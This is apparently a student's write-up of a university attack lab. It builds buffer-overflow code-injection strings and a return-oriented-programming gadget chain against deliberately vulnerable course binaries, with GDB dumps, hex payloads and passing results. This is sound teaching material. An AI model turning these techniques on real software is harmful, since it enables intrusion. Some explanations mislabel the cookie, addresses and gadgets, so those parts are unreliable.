# PART I:

## Level 1:
### 1) Find buffer size
Debug program with `GDB`, set break point at function `getbuf`, then disasamle the code, we can get:
```
=>  0x00000000004017a8 <+0>:	sub    $0x28,%rsp
    0x00000000004017ac <+4>:	mov    %rsp,%rdi
    0x00000000004017af <+7>:	callq  0x401a40 <Gets>
    0x00000000004017b4 <+12>:	mov    $0x1,%eax
    0x00000000004017b9 <+17>:	add    $0x28,%rsp
    0x00000000004017bd <+21>:	retq
 ```
we can see that the program sub `0x28`(`40` in decimal), which means the buffer size is `40`.
### 2) Find 
We can assumpt the return adress in right above the buffer in the stack. To verify our assumption of the buffer size and stack structure, we can run to the the return statement, `0x00000000004017bd <+21>`. Then check the value of the stack pointer `%rsp`, we can get:
 ```
(gdb) x $rsp
0x5561dca0:	0x00401976
 ```
Then, we disassble function `test` -- caller of function `getbuf`, we can get:
 ```
    0x0000000000401968 <+0>:	sub    $0x8,%rsp
    0x000000000040196c <+4>:	mov    $0x0,%eax
 => 0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
    0x0000000000401976 <+14>:	mov    %eax,%edx
    0x0000000000401978 <+16>:	mov    $0x403188,%esi
    0x000000000040197d <+21>:	mov    $0x1,%edi
    0x0000000000401982 <+26>:	mov    $0x0,%eax
    0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
    0x000000000040198c <+36>:	add    $0x8,%rsp
    0x0000000000401990 <+40>:	retq
  ```
We can see that, `0x00401976` is the where `getbuf` returns, which means our assumption is correct

### 3) find adress of `touch1`
Next we should find the adress where `touch1` starts. We can do this by set a break point to `touch1`:
```
(gdb) break touch1
Breakpoint 2 at 0x4017c0: file visible.c, line 25.
```
We can see that the start address of `touch1` is: `0x4017c0`

### 4) Construct the attack string
Finally, we can construct the attack string.
For the first `40` bytes. We can generate some random string. I use the string of 40 `'a'`, which can be represented in hex as:`61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61`
For the remaining part, we should use the little-edian `64` bits address of `touch1`. C will automatically add `\0` to the end of the string, which has hex representation `00`. So, we only need to constuct the first `56` bits as: 
`c0 17 40 00 00 00 00.`
Combine them, we can get our attack string: 
```
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 c0 17 40 00 00 00 00
```

### 5) Verification result:
Run the program, we can get such the successful result (`level1.txt` contains our attack string):
```
li@li-KLV-WX9:~/Desktop/CMU-152-13/target1$ cat level1.txt | ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
    user id	bovik
    course	15213-f15
    lab	attacklab
    result	1:PASS:0xffffffff:ctarget:1:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 C0 17 40 00 00 00 00 
```

## Level 2:
### 1) Analyse the problem:
In the level, the problem we dealing with is that we must satify the condition: `val == cookie`. We can achieve this by doing some code injection.
`val` is passed to the function `touch2()` in register `%rdi`, so we need to change the value of `%rdi` to `cookie`.
So, we can solve the problem by such procedure: 
- When we are in the function `getbuf` Use buffer overflow, change the return adress to the beginning of the buffer, where we can inject our code.
- Then, the program start to excute our injecting code, which should change the register `%rdi` to the value of `cookie`. Then push the adress of `touch2()` to the run-time stack and finally return.
- Finally, the code start to excute `touch2()` with expression `val == cookie` satisified.
    
### 2) Find the beginning address of the buffer
Set a break point in `getbuf` after `Gets()` returned, by looking the assembly code, we can figure out that when the stack pointer points to the beginning of the buffer:
```
    0x00000000004017a8 <+0>:	sub    $0x28,%rsp
    0x00000000004017ac <+4>:	mov    %rsp,%rdi
    0x00000000004017af <+7>:	callq  0x401a40 <Gets>
 => 0x00000000004017b4 <+12>:	mov    $0x1,%eax
    0x00000000004017b9 <+17>:	add    $0x28,%rsp
    0x00000000004017bd <+21>:	retq
 ```
Then by check the value of `%rsp` we can get the adress of the start of buffer:
```
(gdb) x $rsp
0x5561dc78:	0x00000000
```
By convert it to little-endian, we can get the last part of our attack string: `c0 17 40 00 00 00 00`

### 3) Find the injection code
We can write our injection code as:
```
movq $0x59b997fa, %rdi
pushq $0x4017ec
ret
```
In the code, `$0x59b997fa` is the start position of fucntion `touch2()`. `$0x4017ec` is hex representation of our `cookie`.
Then by disassenble the code, we can get the binary representation of the code:
```
0000000000000000 <.text>:
0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
7:	68 ec 17 40 00       	pushq  $0x4017ec
c:	c3                   	retq   
```

### 4) Constuct attack string
The first part of our attack string is the injection code,which is: `48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3`. As it is short than 40 bytes. We can attach some random number behind it. I choose I use the ASCII of `'a'`. So the first part of our attack code is: `48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61`.
Then combine it with the last part of our attack string, which is in step 2), we can get the full attack code:
```
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 78 dc 61 55 00 00 00
```

### 5) Verification result:
Run the program, we can get such the successful result (`level2.txt` contains our attack string):
```
li@li-KLV-WX9:~/Desktop/CMU-152-13/target1$ cat level2.txt | ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
    user id	bovik
    course	15213-f15
    lab	attacklab
    result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 78 DC 61 55 00 00 00
```


## Level 3:
### 1)  Analyse the problem:
In this section, we are faced with two problems. The first problem is that we should rediret our program to the fucntion `touch3()`, which is very similar to the privous 2 levels. And second problem is that we must satisfy the test `strncmp(sval, s, 9) == 0`, which means the string `sval` and `s` must be equal. `s` is a pointer to our `cookie` as a string, i.e the string `"59b997fa"`. The content of the string is constant but the address of the string is random. And `sval` is a pointer points to the string we have to compare with `s`. Because `s` has a random address, we can not just let `sval` points to the same address of `s`. Instead, we should construct the string and store it somewhere. Then, let the `sval` point to the constructed string. That's how we can pass the test.
The general process is similar to level 2. In the function `getbuf()` We use buffer overflow to redirect our program to our injection code. Then use the injection code to construct our string. Finally, redirect our program to `touch3()`.

### 2)  Find the address to store the string
As the function `hexmatch()` and `strncmp()` will rewrite our stack. So, we can't store our string in the injection string. We must store it somewhere else. We can do this by inspecting memory near the run-time stack before and after the excuation of `hexmatch()`, where `0x5561dc78` is the address of the start of our injection code:
Before:
```
(gdb) x/200bx 0x5561dc78
0x5561dc78:	0x48	0xc7	0xc7	0x8c	0xdc	0x61	0x55	0x68
0x5561dc80:	0xfa	0x18	0x40	0x00	0xc3	0x61	0x61	0x61
0x5561dc88:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61
0x5561dc90:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x35
0x5561dc98:	0x39	0x62	0x39	0x39	0x37	0x66	0x61	0x00
0x5561dca0:	0xfa	0x18	0x40	0x00	0x00	0x00	0x00	0x00
0x5561dca8:	0x09	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561dcb0:	0x24	0x1f	0x40	0x00	0x00	0x00	0x00	0x00
0x5561dcb8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561dcc0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dcc8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dcd0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dcd8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dce0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dce8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dcf0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dcf8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dd00:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dd08:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dd10:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dd18:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dd20:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dd28:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dd30:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dd38:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
```

After:
```
(gdb) x/200bx 0x5561dc78
0x5561dc78:	0x00	0x11	0xc5	0x66	0x44	0xfa	0xbd	0xdb
0x5561dc80:	0x8c	0xdc	0x61	0x55	0x00	0x00	0x00	0x00
0x5561dc88:	0xe8	0x5f	0x68	0x55	0x00	0x00	0x00	0x00
0x5561dc90:	0x02	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561dc98:	0x16	0x19	0x40	0x00	0x00	0x00	0x00	0x00
0x5561dca0:	0x00	0x60	0x58	0x55	0x00	0x00	0x00	0x00
0x5561dca8:	0x09	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561dcb0:	0x24	0x1f	0x40	0x00	0x00	0x00	0x00	0x00
0x5561dcb8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561dcc0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dcc8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dcd0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dcd8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dce0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dce8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dcf0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dcf8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dd00:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dd08:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dd10:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dd18:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dd20:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dd28:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dd30:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
0x5561dd38:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
```
We can see that the memory after the address: `0x5561dcb0` are the same before and after the excuation. So, we can choose it as the location of our string.

### 3)  Write the injection code
After finding the location of the string. We can write the injection assembly code as:
```
48 c7 c7 b0 dc 61 55 48 c7 07 35 39 62 39 48 c7 47 04 39 37 66 61 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00
```




# PART2:

## level 2:
### 1)  Problem analysis
In this section, we will exploit the program rtarget, which has random stack adress. This means that we can not rely on the static adress of the stack to inject some code. Instead, we use gadgets from `farm.c` to get the injection code we want.
Our goal in this phase is to satisfy the condition: `val == cookie`, where val should be stored in `%rdi`. Then redirect the program to the function `touch2()`.

### 2)  First attempt
By thinking about the problem, there is a quiet straightforward way to solve it. When the program exucte to `getbuf()`, we can use buffer overflow to change the data in the run-time stack. Then when getbuf returns, we can redirect the program to the gadget that can pop data from the run-time stack and store it to `%rdi`. Finally, return again and redirect the program to `touch2()`.
In this case the flow of our program will be:
- Using buffer overflow, store the data and code to the top of our stack
- `getbuf()` returns. Program go to gadget
- gadget code store the `cookie` to `%rd`i. Gadget returns. Program go to `touch2()`
The assembly code of our gadget should be:
```
popq %rdi
ret
```
There can be some meaningless code between the first line and the second , Like `nop`.
And our run-time stack should contains such content from top to bottom:
address of gadget -> `cookie` -> address of `touch2()`

This process seems feasible. But it turn out cannot be used to this program. Let's figure out why.
First, we should find the address of the gadget. We should dissasemble the farm part of rtarget. We can achieve this by using `objdump -d rtarget`. I have stored the result as file `machine-code-of-farm-in-rtarget.txt`.
Then we should find our disired gadget in it. We start by find the instruction `popq %rdi`. By reading the appendix in the handout, we can find it machine code is `5f`. But when we try to find it in the farm. There is no corresponing code. That's why this method doesn't work.

### 3)  Second attempt
So, we need to change our method. We can cosider to pop the cookie from the stack and temporarily stored in another register. Then move it to `%rdi`. In this case, the flow of our program will be:
- Using buffer overflow, store the data and code to the top of our stack.
- `getbuf()` returns. Program go to gadget1, which pops cookie and stores it in a register. 
- Gadget1 returns. Program go to gadget2, which move the cookie from the register in step2 to `%rdi`
- Gadget2 returns. Program go to `touch2()`
Using `x` to represent the temporary register, we can get
The assembly code of our gadget1 should be:
```
popq x
ret
```
The assembly code of our gadget2 should be:
```
movq x, %rdi
ret
```
There can be some meaningless within the gadget1, Like `nop`.
And our run-time stack should contains such content from top to bottom:
address of gadget1 -> `cookie` -> address of gadget2 -> address of `touch2()`

We can start by finding the instruction `movq x, %rdi` instruction in gadget2, which has binary representation of `48 89 ??`, whre `??` is different according to different `x`. Because it long and we need to satify it first.
By finding `48 89` in our farm. We can find:
`
4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
4019c9:	c3                   	retq   
`
This perfectly corresponding the gadget2 we need. And this pop the cookie to the register `%rax`. So, we the address of our gadget2 is: `4019c5`

Then we can get x is %rax. So we find our gadget1 by find the instruction "popq %rax", which has a binary representation of "58".
By finding "58" in our farm. We can find:
```
4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
4019bb:	c3    
```
This perfectly corresponding the gadget1 we need. So, we the address of our gadget2 is: `4019ab`

### 4)  Compose the attack string
By set the breakpoint we can find the address of `touch2()`:
```
(gdb) break touch2
Breakpoint 1 at 0x4017ec: file visible.c, line 40.
```

The first part of our attack string is irrelavent, I use 40 `00`.
The second part of our attack string is the address and data we put on the stack, remember it's:
address of gadget1 -> `cookie` -> address of gadget2 -> address of `touch2()`
As they are all litte-edian, we can get:
- address of gadget1: `ab 19 40 00 00 00 00 00`
- `cookie`: `fa 97 b9 59 00 00 00 00`
- address of gadget2: `c5 19 40 00 00 00 00 00`
- address of `touch2()`: `ec 17 40 00 00 00 00 00`

So, the whole attack sting is:
```00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 c5 19 40 00 00 00 00 00 ec 17 40 00 00 00 00```

### 5) Verification result:
Run the program, we can get such the successful result (`level2.txt` contains our attack string):
```
li@li-KLV-WX9:~/Desktop/CMU-152-13/target1$ cat part2-level2.txt | ./hex2raw | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
    user id	bovik
    course	15213-f15
    lab	attacklab
    result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00
```
